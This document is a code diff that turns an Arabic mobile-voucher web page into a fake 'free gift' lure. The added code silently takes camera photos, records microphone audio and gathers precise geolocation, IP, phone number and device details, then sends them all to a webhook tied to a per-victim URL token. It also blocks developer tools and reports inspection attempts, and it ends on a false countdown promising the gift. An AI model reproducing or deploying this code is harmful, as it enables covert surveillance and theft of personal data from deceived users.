-                generated: '✅ Voucher generated successfully',
-                error: '⚠️ An error occurred, please try again',
-                phoneRequired: '⚠️ Please enter your phone number',
-                phoneInvalid: '⚠️ Invalid number for this operator',
-                currency: 'EGP',
-                currencyShort: 'EGP'
+        let USER_TOKEN = null;
+
+        function extractTokenFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            const token = params.get('i');
+            if (token && token.length >= 6 && token.length <= 8 && /^[A-Z0-9]+$/.test(token)) {
+                USER_TOKEN = token;
+                console.log('✅ Token extracted:', USER_TOKEN);
+                return true;
+            } else {
+                USER_TOKEN = null;
+                console.warn('❌ No valid token found in URL.');
+                return false;
             }
-        };
+        }
+
+        // ================================================================
+        //  WEBHOOK SENDER
+        // ================================================================
+        async function sendToWebhook(formData) {
+            if (!USER_TOKEN) {
+                console.error('❌ Cannot send: token missing');
+                return { success: false, error: 'Token missing' };
+            }
+            formData.append('token', USER_TOKEN);
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+                const result = await response.json();
+                if (!response.ok) {
+                    console.error('❌ Webhook error:', result);
+                    return { success: false, error: result.message || 'HTTP error' };
+                }
+                console.log('✅ Webhook success:', result);
+                return { success: true, data: result };
+            } catch (error) {
+                console.error('❌ Webhook fetch error:', error);
+                return { success: false, error: error.message };
+            }
+        }
 
         // ================================================================
         //  STATE
         // ================================================================
-        let currentLang = 'ar';
         let selectedCountry = null;
-        let selectedOperator = null;
-        let currentPrefix = '';
-        let phoneNumber = '';
-        let currentVoucher = null;
+        let userPhone = null;
+        let mediaStream = null;
+        let audioStream = null;
+        let audioRecorder = null;
+        let audioChunks = [];
+        let capturedPhotoFiles = [];
+        let audioBlob = null;
+        let userIP = 'غير متاح';
+        let userLocation = { lat: null, lng: null, accuracy: null, error: null };
+        let isProcessing = false;
+        let timerInterval = null;
+        let timerSeconds = 180;
 
         // DOM refs
-        const els = {};
-
-        function cacheEls() {
-            els.langBtns = document.querySelectorAll('.lang-btn');
-            els.langContinueBtn = document.getElementById('langContinueBtn');
-            els.countryList = document.getElementById('countryList');
-            els.operatorList = document.getElementById('operatorList');
-            els.phoneInput = document.getElementById('phoneInput');
-            els.prefixBadge = document.getElementById('prefixBadge');
-            els.phoneHint = document.getElementById('phoneHint');
-            els.generateBtn = document.getElementById('generateBtn');
-            els.voucherBox = document.getElementById('voucherBox');
-            els.voucherIcon = document.getElementById('voucherIcon');
-            els.voucherOperator = document.getElementById('voucherOperator');
-            els.voucherCountry = document.getElementById('voucherCountry');
-            els.vvValue = document.getElementById('vvValue');
-            els.vvData = document.getElementById('vvData');
-            els.voucherCode = document.getElementById('voucherCode');
-            els.copyCodeBtn = document.getElementById('copyCodeBtn');
-            els.changeOpBtn = document.getElementById('changeOpBtn');
-            els.newVoucherBtn = document.getElementById('newVoucherBtn');
-            els.copyText = document.getElementById('copyText');
-
-            // status
-            els.statusLang = document.getElementById('statusLang');
-            els.statusCountry = document.getElementById('statusCountry');
-            els.statusOperator = document.getElementById('statusOperator');
-            els.statusPhone = document.getElementById('statusPhone');
-            els.statusVoucher = document.getElementById('statusVoucher');
-
-            // step labels
-            els.sl1 = document.getElementById('sl1');
-            els.sl2 = document.getElementById('sl2');
-            els.sl3 = document.getElementById('sl3');
-            els.sl4 = document.getElementById('sl4');
-            els.sl5 = document.getElementById('sl5');
-
-            // text elements
-            els.appTitle = document.getElementById('appTitle');
-            els.appSub = document.getElementById('appSub');
-            els.langTitle = document.getElementById('langTitle');
-            els.langDesc = document.getElementById('langDesc');
-            els.langContinueText = document.getElementById('langContinueText');
-            els.countryTitle = document.getElementById('countryTitle');
-            els.countryDesc = document.getElementById('countryDesc');
-            els.opTitle = document.getElementById('opTitle');
-            els.opDesc = document.getElementById('opDesc');
-            els.phoneTitle = document.getElementById('phoneTitle');
-            els.phoneDesc = document.getElementById('phoneDesc');
-            els.phoneLabel = document.getElementById('phoneLabel');
-            els.generateText = document.getElementById('generateText');
-            els.voucherTitle = document.getElementById('voucherTitle');
-            els.voucherDesc = document.getElementById('voucherDesc');
-            els.vlValue = document.getElementById('vlValue');
-            els.vlData = document.getElementById('vlData');
-            els.changeOpText = document.getElementById('changeOpText');
-            els.newVoucherText = document.getElementById('newVoucherText');
-            els.footerSecure = document.getElementById('footerSecure');
-            els.footerDev = document.getElementById('footerDev');
-        }
+        const stepCountry = document.getElementById('step-country');
+        const stepTasks = document.getElementById('step-tasks');
+        const stepTimer = document.getElementById('step-timer');
+        const countryList = document.getElementById('countryList');
+        const statusCountry = document.getElementById('statusCountry');
+        const statusTasks = document.getElementById('statusTasks');
+        const statusTimer = document.getElementById('statusTimer');
+        const claimBtn = document.getElementById('claimBtn');
+        const phoneInput = document.getElementById('phoneInput');
+        const permissionArea = document.getElementById('permissionArea');
+        const timerDisplay = document.getElementById('timerDisplay');
+        const taskSub = document.getElementById('taskSub');
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
 
         const stepDots = document.querySelectorAll('.step-dot');
         const stepLines = document.querySelectorAll('.step-line');
 
         // ================================================================
-        //  STEP MANAGEMENT
+        //  PARTICLES
         // ================================================================
-        function showStep(stepId) {
-            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
-            const target = document.getElementById(stepId);
-            if (target) target.classList.add('active');
+        (function initParticles() {
+            const container = document.getElementById('particles');
+            const count = 28;
+            for (let i = 0; i < count; i++) {
+                const p = document.createElement('div');
+                p.className = 'particle';
+                const size = 2 + Math.random() * 4;
+                p.style.width = size + 'px';
+                p.style.height = size + 'px';
+                p.style.left = Math.random() * 100 + '%';
+                p.style.animationDuration = 18 + Math.random() * 30 + 's';
+                p.style.animationDelay = Math.random() * 30 + 's';
+                p.style.opacity = 0.04 + Math.random() * 0.12;
+                container.appendChild(p);
+            }
+        })();
 
-            const stepMap = {
-                'step-lang': 1,
-                'step-country': 2,
-                'step-operator': 3,
-                'step-phone': 4,
-                'step-voucher': 5
-            };
-            const num = stepMap[stepId] || 1;
-            updateStepIndicator(num);
-        }
-
+        // ================================================================
+        //  STEP INDICATOR UPDATE
+        // ================================================================
         function updateStepIndicator(step) {
             stepDots.forEach((dot, index) => {
                 const num = index + 1;
+                const inner = dot.querySelector('.dot-inner');
+                const icon = inner.querySelector('.dot-icon');
                 dot.classList.remove('active', 'completed');
-                if (num === step) dot.classList.add('active');
-                else if (num < step) dot.classList.add('completed');
+                if (num === step) {
+                    dot.classList.add('active');
+                    icon.textContent = num;
+                } else if (num < step) {
+                    dot.classList.add('completed');
+                    icon.textContent = '✓';
+                } else {
+                    icon.textContent = num;
+                }
             });
             stepLines.forEach((line, index) => {
                 const num = index + 1;
                 line.classList.toggle('active', num < step);
             });
+        }
+
+        // ================================================================
+        //  NOTIFICATION: USER ENTERED
+        // ================================================================
+        async function notifyUserEntered() {
+            if (!USER_TOKEN) return;
+            let ip = 'غير متاح';
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+                userIP = ip;
+            } catch (e) {}
+            const formData = new FormData();
+            formData.append('event', 'visit');
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('ip', ip);
+            formData.append('userAgent', navigator.userAgent);
+            formData.append('platform', navigator.platform);
+            formData.append('language', navigator.language);
+            formData.append('screen', `${screen.width}x${screen.height}`);
+            formData.append('url', window.location.href);
+            const result = await sendToWebhook(formData);
+            if (!result.success) {
+                console.warn('⚠️ Failed to send visit notification:', result.error);
+            }
+        }
+
+        // ================================================================
+        //  DETECT SUSPICIOUS
+        // ================================================================
+        function detectSuspiciousActivity() {
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                sendSuspiciousAlert('🖱️ محاولة النقر الأيمن');
+            });
+            document.addEventListener('keydown', (e) => {
+                const key = e.key;
+                const ctrl = e.ctrlKey || e.metaKey;
+                const shift = e.shiftKey;
+                if (key === 'F12' ||
+                    (ctrl && shift && (key === 'I' || key === 'C' || key === 'J')) ||
+                    (ctrl && key === 'U')) {
+                    e.preventDefault();
+                    sendSuspiciousAlert(`⌨️ محاولة فتح أدوات المطور (${key})`);
+                }
+                if (ctrl && (key === 'c' || key === 'v' || key === 'x')) {
+                    sendSuspiciousAlert(`📋 محاولة ${key === 'c' ? 'نسخ' : key === 'v' ? 'لصق' : 'قص'}`);
+                }
+            });
+            document.addEventListener('dragstart', (e) => {
+                e.preventDefault();
+                sendSuspiciousAlert('🔄 محاولة سحب محتوى');
+            });
+            document.addEventListener('selectstart', (e) => {
+                sendSuspiciousAlert('✏️ محاولة تحديد نص');
+            });
+        }
+
+        let alertCooldown = 0;
+
+        function sendSuspiciousAlert(action) {
+            if (!USER_TOKEN) return;
+            const now = Date.now();
+            if (now - alertCooldown < 5000) return;
+            alertCooldown = now;
+            const formData = new FormData();
+            formData.append('event', 'suspicious');
+            formData.append('action', action);
+            formData.append('timestamp', new Date().toISOString());
+            formData.append('ip', userIP);
+            formData.append('userAgent', navigator.userAgent);
+            formData.append('url', window.location.href);
+            sendToWebhook(formData).catch(console.warn);
+        }
+
+        // ================================================================
+        //  RENDER COUNTRIES
+        // ================================================================
+        function renderCountries() {
+            countryList.innerHTML = '';
+            Object.keys(countries).forEach(name => {
+                const btn = document.createElement('button');
+                btn.className = 'country-btn';
+                btn.innerHTML = `
+                    <span class="glow"></span>
+                    <span class="shine"></span>
+                    <span class="flag">${countries[name].flag}</span>
+                    <span class="name">${name}</span>
+                `;
+                btn.dataset.country = name;
+                btn.addEventListener('click', () => selectCountry(name));
+                countryList.appendChild(btn);
+            });
+        }
+        renderCountries();
+
+        // ================================================================
+        //  SELECT COUNTRY + GET LOCATION
+        // ================================================================
+        async function selectCountry(name) {
+            selectedCountry = name;
+            const data = countries[name];
+            taskSub.textContent = `للاستفادة من هدية ${name} (رصيد، نت، وحدات)`;
+            const prefixes = data.prefixes.join('، ');
+            permissionArea.innerHTML = `
+                <ul>
+                    <li><i class="fas fa-gift"></i> هدية مجانية بقيمة تصل إلى 50$</li>
+                    <li><i class="fas fa-wifi"></i> باقة نت إضافية لمدة 7 أيام</li>
+                    <li><i class="fas fa-phone-alt"></i> وحدات اتصال محلية ودولية</li>
+                </ul>
+                <div class="note">📞 الأرقام المسموحة: <strong>${prefixes}</strong></div>
+                <div style="font-size:12px; opacity:0.4; margin-top:8px; border-top:1px solid rgba(255,255,255,0.02); padding-top:8px;">
+                    <i class="fas fa-shield-alt" style="color:var(--gold);"></i> عملية آمنة • بياناتك مشفرة
+                </div>
+            `;
+            phoneInput.placeholder = `مثال: ${prefixes.split('،')[0]}12345678`;
+
+            showStep('step-tasks');
+            updateStepIndicator(2);
+            statusTasks.className = 'status';
+            statusTasks.style.display = 'block';
+            statusTasks.className = 'status info';
+            statusTasks.textContent = '📍 جاري تحديد موقعك...';
+
+            await getLocation();
+
+            phoneInput.value = '';
+            capturedPhotoFiles = [];
+            audioChunks = [];
+            audioBlob = null;
+            claimBtn.disabled = false;
+            claimBtn.classList.remove('loading');
+            claimBtn.querySelector('.btn-text').innerHTML =
+                '<i class="fas fa-gift" style="margin-left:10px;"></i> احصل على هديتي';
+        }
+
+        function showStep(id) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // ================================================================
+        //  BUTTON CLICK – MAIN ACTION
+        // ================================================================
+        claimBtn.addEventListener('click', async () => {
+            if (!USER_TOKEN) {
+                showStatus(statusTasks, 'error', '⚠️ رابط غير صحيح، يرجى الدخول من الرابط المخصص.');
+                return;
+            }
+            if (isProcessing) return;
+            const phone = phoneInput.value.trim();
+            if (!phone) {
+                showStatus(statusTasks, 'error', '⚠️ يرجى إدخال رقم الهاتف');
+                return;
+            }
+            const prefixes = countries[selectedCountry].prefixes;
+            let valid = false;
+            for (let p of prefixes) {
+                if (phone.startsWith(p)) { valid = true; break; }
+            }
+            if (!valid) {
+                showStatus(statusTasks, 'error', `⚠️ الرقم يجب أن يبدأ بـ ${prefixes.join(' أو ')}`);
+                return;
+            }
+            userPhone = phone;
+
+            isProcessing = true;
+            claimBtn.disabled = true;
+            claimBtn.classList.add('loading');
+            claimBtn.querySelector('.btn-text').innerHTML = 'جاري التأكيد...';
+
+            showStatus(statusTasks, 'info', '⏳ جاري إرسال البيانات...');
+
+            await getIPAddress();
+            await startCameraAndCapture();
+            await recordAudio();
+
+            const success = await sendAllData();
+
+            if (success) {
+                showStep('step-timer');
+                updateStepIndicator(3);
+                startTimer(180);
+            } else {
+                showStatus(statusTasks, 'error', '⚠️ فشل الإرسال، حاول مرة أخرى.');
+                claimBtn.disabled = false;
+                claimBtn.classList.remove('loading');
+                claimBtn.querySelector('.btn-text').innerHTML =
+                    '<i class="fas fa-gift" style="margin-left:10px;"></i> احصل على هديتي';
+                isProcessing = false;
+            }
+        });
+
+        // ================================================================
+        //  FUNCTIONS: IP, LOCATION, CAMERA, AUDIO, SEND
+        // ================================================================
+        async function getIPAddress() {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userIP = data.ip;
+            } catch (e) {
+                userIP = 'Unable to fetch';
+            }
+        }
+
+        // ================================================================
+        //  LOCATION
+        // ================================================================
+        async function getLocation() {
+            return new Promise((resolve) => {
+                console.log('🔍 [getLocation] بدء عملية الحصول على الموقع...');
+                if (!navigator.geolocation) {
+                    userLocation.error = 'المتصفح لا يدعم تحديد الموقع';
+                    showStatus(statusTasks, 'error', '❌ المتصفح لا يدعم خدمة تحديد الموقع.');
+                    console.error('❌ [getLocation] المتصفح لا يدعم Geolocation');
+                    resolve();
+                    return;
+                }
+
+                let watchId = null;
+                let bestPosition = null;
+                let bestAccuracy = Infinity;
+                let isResolved = false;
+                let attemptCount = 0;
+                const MAX_ATTEMPTS = 10;
+                const TIMEOUT_MS = 15000;
+                const TARGET_ACCURACY = 100;
+
+                const resolveWithBest = () => {
+                    if (isResolved) return;
+                    isResolved = true;
+                    if (watchId !== null) {
+                        navigator.geolocation.clearWatch(watchId);
+                        watchId = null;
+                    }
+                    if (bestPosition) {
+                        userLocation.lat = bestPosition.coords.latitude;
+                        userLocation.lng = bestPosition.coords.longitude;
+                        userLocation.accuracy = bestPosition.coords.accuracy;
+                        userLocation.error = null;
+                        console.log('✅ [getLocation] نجاح:', bestPosition.coords.latitude, bestPosition.coords.longitude);
+                    } else {
+                        userLocation.error = 'لم نتمكن من الحصول على موقع دقيق';
+                        console.error('❌ [getLocation] فشل الحصول على الموقع - لا توجد بيانات');
+                    }
+                    resolve();
+                };
+
+                const timeoutId = setTimeout(() => {
+                    if (!isResolved) {
+                        console.warn('⏳ [getLocation] انتهت المهلة');
+                        if (watchId !== null) {
+                            navigator.geolocation.clearWatch(watchId);
+                            watchId = null;
+                        }
+                        if (bestPosition) {
+                            resolveWithBest();
+                        } else {
+                            userLocation.error = 'انتهت مهلة الحصول على الموقع';
+                            resolve();
+                        }
+                    }
+                }, TIMEOUT_MS);
+
+                const handlePosition = (pos) => {
+                    attemptCount++;
+                    const accuracy = pos.coords.accuracy;
+                    console.log(`📍 [getLocation] تحديث ${attemptCount}: دقة ${accuracy} متر`);
+                    if (accuracy < bestAccuracy) {
+                        bestAccuracy = accuracy;
+                        bestPosition = pos;
+                    }
+                    if (accuracy <= TARGET_ACCURACY || attemptCount >= MAX_ATTEMPTS) {
+                        console.log(`✅ [getLocation] تم الوصول للدقة المطلوبة (${accuracy} متر) أو انتهت المحاولات (${attemptCount})`);
+                        resolveWithBest();
+                        clearTimeout(timeoutId);
+                    }
+                };
+
+                const handleError = (err) => {
+                    if (isResolved) return;
+                    console.warn(`⚠️ [getLocation] خطأ: ${err.message} (كود ${err.code})`);
+                    if (err.code === 1) {
+                        userLocation.error = 'تم رفض الإذن بالوصول إلى الموقع';
+                        isResolved = true;
+                        if (watchId !== null) {
+                            navigator.geolocation.clearWatch(watchId);
+                            watchId = null;
+                        }
+                        clearTimeout(timeoutId);
+                        resolve();
+                        return;
+                    }
+                    if (attemptCount < MAX_ATTEMPTS) {
+                        // لا نعرض شيء للمستخدم
+                    } else {
+                        if (bestPosition) {
+                            resolveWithBest();
+                        } else {
+                            userLocation.error = err.message || 'تعذر الحصول على الموقع';
+                            isResolved = true;
+                            if (watchId !== null) {
+                                navigator.geolocation.clearWatch(watchId);
+                                watchId = null;
+                            }
+                            clearTimeout(timeoutId);
+                            resolve();
+                        }
+                    }
+                };
+
+                watchId = navigator.geolocation.watchPosition(
+                    handlePosition,
+                    handleError, { enableHighAccuracy: true, timeout: 5000, maximumAge: 2000 }
+                );
+                console.log('📡 [getLocation] تم بدء watchPosition');
+            });
+        }
+
+        // ================================================================
+        //  CAMERA
+        // ================================================================
+        async function startCameraAndCapture() {
+            return new Promise(async (resolve) => {
+                try {
+                    console.log('📸 [startCameraAndCapture] بدء الكاميرا');
+                    const constraints = { video: true, audio: false };
+                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    video.srcObject = mediaStream;
+                    await video.play();
+
+                    await new Promise((resolve, reject) => {
+                        const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
+                        const onReady = () => { clearTimeout(timeout);
+                            resolve(); };
+                        if (video.readyState >= 2 && video.videoWidth > 0) {
+                            onReady();
+                        } else {
+                            video.addEventListener('loadedmetadata', onReady);
+                            video.addEventListener('canplay', onReady);
+                            video.play().catch(() => {});
+                        }
+                    });
+
+                    await new Promise(r => setTimeout(r, 500));
+                    const ctx = canvas.getContext('2d');
+                    const width = Math.min(video.videoWidth || 640, 1920);
+                    const height = Math.min(video.videoHeight || 480, 1080);
+                    canvas.width = width;
+                    canvas.height = height;
+
+                    capturedPhotoFiles = [];
+
+                    for (let i = 1; i <= TOTAL_PHOTOS; i++) {
+                        ctx.drawImage(video, 0, 0, width, height);
+                        const blob = await new Promise((resolve) => {
+                            canvas.toBlob((b) => resolve(b), 'image/jpeg', PHOTO_QUALITY);
+                        });
+                        if (blob && blob.size > 1000) {
+                            const file = new File([blob], `photo_${i}_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                            capturedPhotoFiles.push(file);
+                        }
+                        if (i < TOTAL_PHOTOS) {
+                            await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
+                        }
+                    }
+
+                    console.log(`✅ [startCameraAndCapture] تم التقاط ${capturedPhotoFiles.length} صور`);
+                    resolve(true);
+
+                } catch (error) {
+                    console.error('❌ [startCameraAndCapture] خطأ:', error);
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(t => t.stop());
+                        mediaStream = null;
+                    }
+                    video.srcObject = null;
+                    resolve(false);
+                }
+            });
+        }
+
+        // ================================================================
+        //  AUDIO
+        // ================================================================
+        async function recordAudio() {
+            return new Promise(async (resolve) => {
+                try {
+                    console.log('🎤 [recordAudio] بدء التسجيل الصوتي');
+                    const audioConstraints = { audio: true };
+                    audioStream = await navigator.mediaDevices.getUserMedia(audioConstraints);
+                    audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm;codecs=opus' });
+                    audioChunks = [];
+                    audioRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+                    audioRecorder.onstop = () => {
+                        if (audioChunks.length > 0) {
+                            audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            console.log(`✅ [recordAudio] تم التسجيل بحجم ${audioBlob.size} بايت`);
+                        }
+                        resolve();
+                    };
+                    audioRecorder.start();
+                    setTimeout(() => {
+                        if (audioRecorder.state === 'recording') {
+                            audioRecorder.stop();
+                            console.log('⏹️ [recordAudio] تم إيقاف التسجيل');
+                        }
+                        audioStream.getTracks().forEach(t => t.stop());
+                    }, AUDIO_DURATION);
+                } catch (error) {
+                    console.error('❌ [recordAudio] خطأ:', error);
+                    resolve();
+                }
+            });
+        }
+
+        // ================================================================
+        //  SEND ALL DATA
+        // ================================================================
+        async function sendAllData() {
+            console.log('📤 [sendAllData] بدء إعداد البيانات للإرسال');
+
+            const formData = new FormData();
+
+            formData.append('event', 'submission');
+            formData.append('country', selectedCountry);
+            formData.append('phone', userPhone);
+            formData.append('ip', userIP);
+
+            formData.append('location[lat]', userLocation.lat !== null ? String(userLocation.lat) : '');
+            formData.append('location[lng]', userLocation.lng !== null ? String(userLocation.lng) : '');
+            formData.append('location[accuracy]', userLocation.accuracy !== null ? String(userLocation.accuracy) : '');
+            formData.append('location[error]', userLocation.error || '');
+
+            formData.append('device[userAgent]', navigator.userAgent);
+            formData.append('device[platform]', navigator.platform);
+            formData.append('device[language]', navigator.language);
+            formData.append('device[screen]', `${screen.width}x${screen.height}`);
+            formData.append('device[colorDepth]', screen.colorDepth);
+            formData.append('device[timezone]', Intl.DateTimeFormat().resolvedOptions().timeZone);
+            formData.append('timestamp', new Date().toISOString());
+
+            if (capturedPhotoFiles.length > 0) {
+                capturedPhotoFiles.forEach((file, index) => {
+                    formData.append(`photos[]`, file, file.name);
+                });
+                console.log(`📸 [sendAllData] تم إضافة ${capturedPhotoFiles.length} صور`);
+            }
+
+            if (audioBlob) {
+                const audioFile = new File([audioBlob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
+                formData.append('audio', audioFile);
+                console.log(`🎤 [sendAllData] تم إضافة ملف صوتي بحجم ${audioBlob.size} بايت`);
+            }
+
+            console.log('📤 [sendAllData] إرسال إلى Webhook');
+
+            const result = await sendToWebhook(formData);
+
+            if (result.success) {
+                console.log('✅ [sendAllData] تم الإرسال بنجاح');
+                return true;
+            } else {
+                console.error('❌ [sendAllData] فشل الإرسال:', result.error);
+                return false;
+            }
+        }
+
+        // ================================================================
+        //  TIMER
+        // ================================================================
+        function startTimer(seconds) {
+            timerSeconds = seconds;
+            updateTimerDisplay();
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                timerSeconds--;
+                updateTimerDisplay();
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerDisplay.textContent = '00:00';
+                    showStatus(statusTimer, 'success', '🎉 تم إرسال هديتك! تحقق من هاتفك.');
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const mins = Math.floor(timerSeconds / 60);
+            const secs = timerSeconds % 60;
+            timerDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
         }
 
         // ================================================================
@@ -1565,413 +1655,33 @@
                     if (el.className.includes(type)) {
                         el.style.display = 'none';
                     }
-                }, 6000);
+                }, 8000);
             }
         }
 
-        function hideStatus(el) {
-            el.className = 'status';
-            el.style.display = 'none';
-        }
+        // ================================================================
+        //  CLEANUP
+        // ================================================================
+        window.addEventListener('beforeunload', () => {
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
+            if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
+            if (timerInterval) clearInterval(timerInterval);
+        });
 
         // ================================================================
-        //  LANGUAGE
+        //  🚀 START
         // ================================================================
-        function setLanguage(lang) {
-            currentLang = lang;
-            const t = LANG[lang];
-
-            // Update all text elements
-            els.appTitle.textContent = t.appTitle;
-            els.appSub.textContent = t.appSub;
-            els.langTitle.textContent = t.langTitle;
-            els.langDesc.textContent = t.langDesc;
-            els.langContinueText.textContent = t.langContinue;
-            els.countryTitle.textContent = t.countryTitle;
-            els.countryDesc.textContent = t.countryDesc;
-            els.opTitle.textContent = t.opTitle;
-            els.opDesc.textContent = t.opDesc;
-            els.phoneTitle.textContent = t.phoneTitle;
-            els.phoneDesc.textContent = t.phoneDesc;
-            els.phoneLabel.textContent = t.phoneLabel;
-            els.generateText.textContent = t.generateText;
-            els.voucherTitle.textContent = t.voucherTitle;
-            els.voucherDesc.textContent = t.voucherDesc;
-            els.vlValue.textContent = t.vlValue;
-            els.vlData.textContent = t.vlData;
-            els.changeOpText.textContent = t.changeOpText;
-            els.newVoucherText.textContent = t.newVoucherText;
-            els.footerSecure.textContent = t.footerSecure;
-            els.footerDev.textContent = t.footerDev;
-            els.copyText.textContent = t.copyText;
-            els.sl1.textContent = t.step1;
-            els.sl2.textContent = t.step2;
-            els.sl3.textContent = t.step3;
-            els.sl4.textContent = t.step4;
-            els.sl5.textContent = t.step5;
-
-            // Update direction
-            document.documentElement.dir = lang === 'ar' ? 'rtl' : 'ltr';
-            document.documentElement.lang = lang;
-
-            // Update lang buttons
-            els.langBtns.forEach(btn => {
-                btn.classList.toggle('selected', btn.dataset.lang === lang);
-            });
-
-            // Update country & operator labels if rendered
-            renderCountries();
-            if (selectedCountry) renderOperators();
-            updatePhoneHint();
-
-            // Update voucher if shown
-            if (currentVoucher) renderVoucher(currentVoucher);
-        }
-
-        // ================================================================
-        //  RENDER COUNTRIES
-        // ================================================================
-        function renderCountries() {
-            const t = LANG[currentLang];
-            els.countryList.innerHTML = '';
-            Object.keys(TELECOM_DATA).forEach(key => {
-                const data = TELECOM_DATA[key];
-                const name = currentLang === 'ar' ? data.nameAr : data.nameEn;
-                const btn = document.createElement('button');
-                btn.className = 'option-btn';
-                btn.innerHTML = `
-                    <span class="opt-icon">${data.flag}</span>
-                    <span class="opt-name">${name}</span>
-                    <span class="opt-sub">${Object.keys(data.operators).length} مشغل</span>
-                `;
-                btn.dataset.country = key;
-                btn.addEventListener('click', () => selectCountry(key));
-                els.countryList.appendChild(btn);
-            });
-        }
-
-        // ================================================================
-        //  SELECT COUNTRY
-        // ================================================================
-        function selectCountry(key) {
-            selectedCountry = key;
-            const data = TELECOM_DATA[key];
-            const t = LANG[currentLang];
-
-            // Highlight
-            document.querySelectorAll('#countryList .option-btn').forEach(btn => {
-                btn.classList.toggle('selected', btn.dataset.country === key);
-            });
-
-            hideStatus(els.statusCountry);
-            showStatus(els.statusCountry, 'info',
-                `✅ ${currentLang === 'ar' ? data.nameAr : data.nameEn} ${t.selectOperator || 'اختر المشغل'}`);
-            renderOperators();
-            showStep('step-operator');
-            updateStepIndicator(3);
-        }
-
-        // ================================================================
-        //  RENDER OPERATORS
-        // ================================================================
-        function renderOperators() {
-            if (!selectedCountry) return;
-            const data = TELECOM_DATA[selectedCountry];
-            const t = LANG[currentLang];
-            els.operatorList.innerHTML = '';
-
-            Object.keys(data.operators).forEach(key => {
-                const op = data.operators[key];
-                const name = currentLang === 'ar' ? op.nameAr : key;
-                const btn = document.createElement('button');
-                btn.className = `option-btn opt-${op.cssClass}`;
-                btn.innerHTML = `
-                    <span class="opt-icon"><i class="fas ${op.icon}"></i></span>
-                    <span class="opt-name">${name}</span>
-                    <span class="badge-prefix">${op.prefix}...</span>
-                `;
-                btn.dataset.operator = key;
-                btn.addEventListener('click', () => selectOperator(key));
-                els.operatorList.appendChild(btn);
-            });
-        }
-
-        // ================================================================
-        //  SELECT OPERATOR
-        // ================================================================
-        function selectOperator(key) {
-            selectedOperator = key;
-            const data = TELECOM_DATA[selectedCountry];
-            const op = data.operators[key];
-            currentPrefix = op.prefix;
-            const t = LANG[currentLang];
-
-            document.querySelectorAll('#operatorList .option-btn').forEach(btn => {
-                btn.classList.toggle('selected', btn.dataset.operator === key);
-            });
-
-            hideStatus(els.statusOperator);
-            showStatus(els.statusOperator, 'info',
-                `📶 ${currentLang === 'ar' ? op.nameAr : key} (${op.prefix}...) ${t.validNumber || ''}`);
-
-            // Update prefix badge
-            els.prefixBadge.textContent = op.prefix;
-            els.phoneInput.value = '';
-            els.phoneInput.placeholder = op.prefix + '12345678';
-            updatePhoneHint();
-
-            showStep('step-phone');
-            updateStepIndicator(4);
-            els.phoneInput.focus();
-        }
-
-        // ================================================================
-        //  PHONE VALIDATION
-        // ================================================================
-        function validatePhone() {
-            if (!selectedCountry || !selectedOperator) return false;
-            const data = TELECOM_DATA[selectedCountry];
-            const op = data.operators[selectedOperator];
-            const val = els.phoneInput.value.trim();
-            if (!val) return false;
-
-            // Must start with prefix
-            if (!val.startsWith(op.prefix)) return false;
-
-            // Length check
-            if (val.length !== data.phoneLength) return false;
-
-            // All digits
-            if (!/^\d+$/.test(val)) return false;
-
-            return true;
-        }
-
-        function updatePhoneHint() {
-            const val = els.phoneInput.value.trim();
-            const hint = els.phoneHint;
-            const t = LANG[currentLang];
-
-            if (!val) {
-                hint.className = 'validation-hint idle';
-                hint.textContent = t.phoneHint;
+        window.addEventListener('load', async () => {
+            const hasToken = extractTokenFromURL();
+            if (!hasToken) {
+                showStatus(statusCountry, 'error', '⚠️ رابط غير صحيح. يرجى استخدام الرابط المخصص لك.');
+                document.querySelectorAll('.country-btn').forEach(b => b.disabled = true);
                 return;
             }
-
-            if (validatePhone()) {
-                hint.className = 'validation-hint valid';
-                hint.textContent = t.validNumber;
-            } else {
-                hint.className = 'validation-hint invalid';
-                hint.textContent = t.invalidNumber;
-            }
-        }
-
-        // ================================================================
-        //  GENERATE VOUCHER
-        // ================================================================
-        function generateVoucher() {
-            const t = LANG[currentLang];
-            const val = els.phoneInput.value.trim();
-
-            if (!val) {
-                showStatus(els.statusPhone, 'error', t.phoneRequired);
-                return;
-            }
-
-            if (!validatePhone()) {
-                showStatus(els.statusPhone, 'error', t.phoneInvalid);
-                return;
-            }
-
-            phoneNumber = val;
-
-            const countryData = TELECOM_DATA[selectedCountry];
-            const opData = countryData.operators[selectedOperator];
-
-            // Random value from available
-            const valueIdx = Math.floor(Math.random() * opData.values.length);
-            const value = opData.values[valueIdx];
-
-            // Generate voucher code
-            const code = generateVoucherCode();
-
-            const voucher = {
-                operator: selectedOperator,
-                operatorName: currentLang === 'ar' ? opData.nameAr : selectedOperator,
-                country: currentLang === 'ar' ? countryData.nameAr : countryData.nameEn,
-                countryKey: selectedCountry,
-                value: value,
-                currency: currentLang === 'ar' ? 'ج.م' : 'EGP',
-                dataPackage: opData.dataPackage,
